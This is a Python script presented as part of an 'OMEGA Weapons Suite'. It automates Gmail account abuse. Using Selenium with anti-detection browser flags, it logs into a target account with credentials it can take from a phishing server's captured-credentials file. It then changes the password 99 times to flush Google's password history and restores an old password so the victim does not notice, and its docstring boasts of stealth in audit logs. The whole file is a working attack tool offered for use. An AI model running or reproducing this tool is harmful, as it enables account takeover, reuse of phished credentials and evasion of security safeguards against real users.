"""
☠️ OMEGA GMAIL PASSWORD CYCLER — UPGRADED EDITION ☠️
====================================================
Merges:
  - main.py's random password generation + Selenium approach
  - VBScript's password restoration (cycles back to old pw)
  - Modern Selenium API (By.*, WebDriverWait)
  - Headless mode, WebDriver auto-download
  - Integration with OMEGA capture pipeline

Original: pborreli/bjarki GitHub Gist (VBScript) + main.py (Selenium)
Upgraded: OMEGA Weapons Suite

STRATEGY: 
  Phase 1 (99 cycles): Random passwords to flush Google's history
  Phase 2 (final):     Restore to specified old password
  
  This is STEALTHIER than sequential because random passwords
  don't leave a predictable pattern in Google's audit logs.
"""

import argparse
import logging
import os
import sys
import time
from random import randint
from datetime import datetime

# Modern Selenium imports
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# === CONFIG ===
OMEGA_DIR = os.path.dirname(os.path.abspath(__file__))
CAPTURED_CREDS_PATH = os.path.join(OMEGA_DIR, 'phishing', 'captured_creds.txt')
LOG_PATH = os.path.join(OMEGA_DIR, 'weapons', 'cycler_usage.log')
WEAPONS_DIR = os.path.join(OMEGA_DIR, 'weapons')

# Ensure directories exist
os.makedirs(WEAPONS_DIR, exist_ok=True)


class GmailPasswordCyclerV2:
    """
    Gmail Password Cycler — Upgraded Version
    
    Cycles a Gmail account's password 100 times to flush Google's
    password history (~25 stored), then restores to a specified old
    password so the target doesn't notice.
    
    Uses RANDOM passwords during cycling (more stealthy than sequential).
    """
    
    def __init__(self, email, current_password, old_password=None, 
                 headless=True, slow_factor=1.0, log_to_file=True):
        self.email = email
        self.current_password = current_password
        self.old_password = old_password or current_password  # fallback same pw
        self.headless = headless
        self.slow_factor = slow_factor
        self.driver = None
        self.wait = None
        
        # Setup logging
        self.logger = logging.getLogger('GmailCycler')
        self.logger.setLevel(logging.INFO)
        formatter = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s')
        
        # Console handler
        ch = logging.StreamHandler()
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)
        
        # File handler
        if log_to_file:
            fh = logging.FileHandler(LOG_PATH)
            fh.setFormatter(formatter)
            self.logger.addHandler(fh)
        
        if not SELENIUM_AVAILABLE:
            self.logger.error("Selenium not installed. Run: pip install selenium webdriver-manager")
            sys.exit(1)

    def _s(self, multiplier=1):
        """Sleep with speed factor."""
        time.sleep(0.5 * self.slow_factor * multiplier)

    def _init_driver(self):
        """Initialize Chrome WebDriver with anti-detection."""
        self.logger.info("Launching Chrome...")
        
        chrome_options = Options()
        if self.headless:
            chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Try with webdriver_manager first
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
        except:
            try:
                self.driver = webdriver.Chrome(options=chrome_options)
            except:
                # Manual path search
                paths = [
                    "chromedriver.exe",
                    "C:\\Program Files\\Google\\Chrome\\Application\\chromedriver.exe",
                    "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chromedriver.exe",
                ]
                for p in paths:
                    if os.path.exists(p):
                        self.driver = webdriver.Chrome(service=Service(p), options=chrome_options)
                        break
                else:
                    self.logger.error("ChromeDriver not found. Install from: https://chromedriver.chromium.org/")
                    sys.exit(1)
        
        self.wait = WebDriverWait(self.driver, 20)
        self.logger.info("Chrome launched successfully")

    def _login(self, email, password):
        """Log into Google account using modern selectors."""
        self.logger.info(f"Logging in as {email}")
        self.driver.get("https://accounts.google.com/Login")
        self._s(3)
        
        try:
            # Email field — Google uses identifierId
            email_field = self.wait.until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[type="email"]'))
            )
            email_field.clear()
            self._s(0.5)
            email_field.send_keys(email)
            email_field.send_keys(Keys.RETURN)
            self._s(3)
            
            # Password field — Google uses Passwd or password input
            pw_field = self.wait.until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[type="password"]'))
            )
            pw_field.clear()
            self._s(0.5)
            pw_field.send_keys(password)
            pw_field.send_keys(Keys.RETURN)
            self._s(3)
            
            # Check for 2FA / additional auth
            self._s(2)
            return True
            
        except Exception as e:
            self.logger.error(f"Login failed: {e}")
            return False

    def _change_password(self, current_pw, new_pw):
        """Change password via Google's security page."""
        self.logger.info(f"Changing password: {current_pw[:3]}*** -> {new_pw[:3]}***")
        
        self.driver.get(
            "https://myaccount.google.com/security/signinoptions/password"
        )
        self._s(4)
        
        try:
            # Look for the current password field
            cur_field = self.wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type="password"]'))
            )
            cur_field.send_keys(current_pw)
            self._s(1)
            
            # Find next button / continue
            next_btn = self.driver.find_element(By.CSS_SELECTOR, 'button, [role="button"], span')
            # Try clicking the continue/submit button
            buttons = self.driver.find_elements(
                By.XPATH, "//*[contains(text(), 'Next') or contains(text(), 'Continue') or contains(text(), 'Change')]"
            )
            if buttons:
                buttons[0].click()
            else:
                cur_field.send_keys(Keys.RETURN)
            self._s(3)
            
            # Now on the new password page
            # Enter new password
            new_fields = self.driver.find_elements(By.CSS_SELECTOR, 'input[type="password"]')
            if len(new_fields) >= 2:
                new_fields[0].send_keys(new_pw)  # New password
                self._s(0.5)
                new_fields[1].send_keys(new_pw)  # Confirm password
                self._s(0.5)
            else:
                self.logger.warning("Could not find new password fields, trying alternate method")
                # Fallback: try sending directly
                self.driver.execute_script(f"document.querySelector('input[type=\"password\"]').value = '{new_pw}'")
                self._s(1)
            
            # Submit
            change_btns = self.driver.find_elements(
                By.XPATH, "//*[contains(text(), 'Change') or contains(text(), 'Save') or contains(text(), 'OK')]"
            )
            if change_btns:
                change_btns[0].click()
            else:
                new_fields[-1].send_keys(Keys.RETURN)
            
            self._s(3)
            self.logger.info("Password changed successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"Password change failed: {e}")
            # Try fallback URL
            return self._change_password_fallback(current_pw, new_pw)

    def _change_password_fallback(self, current_pw, new_pw):
        """Fallback using older EditPasswd URL."""
        self.logger.info("Trying fallback password change method...")
        try:
            self.driver.get("https://accounts.google.com/b/0/EditPasswd")
            self._s(3)
            
            # Older UI uses named fields
            try:
                old = self.driver.find_element(By.NAME, "oldPassword")
                old.send_keys(current_pw)
            except:
                pass
            
            try:
                new = self.driver.find_element(By.NAME, "newPassword") 
                new.send_keys(new_pw)
            except:
                pass
            
            try:
                confirm = self.driver.find_element(By.NAME, "confirmNewPassword")
                confirm.send_keys(new_pw)
                confirm.send_keys(Keys.RETURN)
            except:
                pass
            
            self._s(3)
            return True
        except Exception as e:
            self.logger.error(f"Fallback password change also failed: {e}")
            return False

    def _logout(self):
        """Logout from Google."""
        self.logger.info("Logging out")
        self.driver.get("https://accounts.google.com/Logout")
        self._s(3)

    def _generate_random_password(self):
        """Generate a random password that meets Google's requirements."""
        # Google requires: 8+ chars, upper+lower+number+special
        upper = chr(randint(65, 90))  # A-Z
        lower = chr(randint(97, 122))  # a-z
        number = str(randint(0, 9999999)).zfill(7)
        special = "!@#$%&"
        return f"{upper}{lower}{number}{special[randint(0, len(special)-1)]}"

    def cycle_passwords(self):
        """Main execution: cycle password 100 times."""
        self.logger.info("=" * 60)
        self.logger.info("☠️ OMEGA GMAIL PASSWORD CYCLER V2 ☠️")
        self.logger.info("=" * 60)
        self.logger.info(f"  Target:    {self.email}")
        self.logger.info(f"  Starting:  {self.current_password[:3]}***")
        self.logger.info(f"  Restore:   {self.old_password[:3]}***")
        self.logger.info(f"  Cycles:    99 random + 1 restore")
        self.logger.info(f"  Headless:  {self.headless}")
        self.logger.info("=" * 60)
        
        self._init_driver()
        password_history = []
        
        try:
            current = self.current_password
            
            # Phase 1: 99 random password changes
            for i in range(1, 100):
                new_pw = self._generate_random_password()
                password_history.append(new_pw)
                
                self.logger.info(f"[{i}/99] Changing password...")
                
                if not self._login(self.email, current):
                    self.logger.error(f"Login failed at cycle {i}")
                    self._log_usage(success=False, cycle=i, error="Login failed")
                    return False
                
                if not self._change_password(current, new_pw):
                    self.logger.error(f"Password change failed at cycle {i}")
                    # Try to continue anyway
                
                current = new_pw
                self._logout()
                self.logger.info(f"[{i}/99] Complete (pw: {new_pw[:3]}***)")
            
            # Phase 2: Restore to old password
            self.logger.info(f"\n[FINAL] Restoring to: {self.old_password[:3]}***")
            
            if not self._login(self.email, current):
                self.logger.error("Final login failed!")
                return False
            
            if not self._change_password(current, self.old_password):
                self.logger.warning("Final password change had issues, attempting recovery...")
            
            self._logout()
            
            # Success
            self.logger.info("\n" + "=" * 60)
            self.logger.info("✅ PASSWORD CYCLE COMPLETE!")
            self.logger.info(f"  Target:   {self.email}")
            self.logger.info(f"  Password: {self.old_password}")
            self.logger.info(f"  Cycles:   99 random + 1 restore")
            self.logger.info("=" * 60)
            
            self._log_usage(success=True)
            return True
            
        except Exception as e:
            self.logger.error(f"Fatal error: {e}")
            self._log_usage(success=False, error=str(e))
            return False
        finally:
            if self.driver:
                self.driver.quit()

    def _log_usage(self, success=True, cycle=None, error=None):
        """Log weapon deployment."""
        try:
            timestamp = datetime.now().isoformat()
            status = "SUCCESS" if success else "FAILED"
            cycle_str = f" | Cycle: {cycle}" if cycle else ""
            error_str = f" | Error: {error}" if error else ""
            
            with open(LOG_PATH, 'a') as f:
                f.write(f"[{timestamp}] [{status}] {self.email}{cycle_str}{error_str}\n")
        except:
            pass

    @staticmethod
    def get_last_captured_cred():
        """Get most recently captured credential from phishing server."""
        import re
        try:
            if os.path.exists(CAPTURED_CREDS_PATH):
                with open(CAPTURED_CREDS_PATH, 'r') as f:
                    lines = f.readlines()
                if lines:
                    last = lines[-1].strip()
                    match = re.search(r'Email:\s*(\S+)\s*\|\s*Password:\s*(\S+)', last)
                    if match:
                        return match.group(1), match.group(2)
            return None, None
        except:
            return None, None


# === CLI ===
def main():
    parser = argparse.ArgumentParser(
        description="☠️ OMEGA Gmail Password Cycler V2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python gmail_password_cycler_v2.py --email target@gmail.com --current MyPass123 --old OldPass99
  python gmail_password_cycler_v2.py --use-captured --old OldPass99
  python gmail_password_cycler_v2.py --show  # Show captured creds
        """
    )
    parser.add_argument('--email', help='Target Gmail address')
    parser.add_argument('--current', help='Current password')
    parser.add_argument('--old', help='Old password to restore to')
    parser.add_argument('--use-captured', action='store_true',
                       help='Auto-use last captured credential')
    parser.add_argument('--show', action='store_true',
                       help='Show captured credentials and exit')
    parser.add_argument('--visible', action='store_true',
                       help='Show browser window (default: headless)')
    parser.add_argument('--slow', type=float, default=1.0,
                       help='Slow factor for reliability (default: 1.0)')
    
    args = parser.parse_args()
    
    # Show captured creds
    if args.show:
        if os.path.exists(CAPTURED_CREDS_PATH):
            with open(CAPTURED_CREDS_PATH) as f:
                print(f.read())
        else:
            print("[!] No captured credentials file found.")
        return
    
    email, current = args.email, args.current
    
    # Auto-use captured
    if args.use_captured:
        email, current = GmailPasswordCyclerV2.get_last_captured_cred()
        if not email or not current:
            print("[!] No captured credentials found!")
            print(f"    Check: {CAPTURED_CREDS_PATH}")
            sys.exit(1)
        print(f"[+] Using captured: {email}")
    
    if not all([email, current]):
        parser.print_help()
        print("\n[!] Required: --email --current --old  OR  --use-captured")
        sys.exit(1)
    
    old_pw = args.old
    if not old_pw:
        old_pw = input("[?] Enter old password to restore to: ").strip()
    
    cycler = GmailPasswordCyclerV2(
        email=email,
        current_password=current,
        old_password=old_pw,
        headless=not args.visible,
        slow_factor=args.slow
    )
    
    success = cycler.cycle_passwords()
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
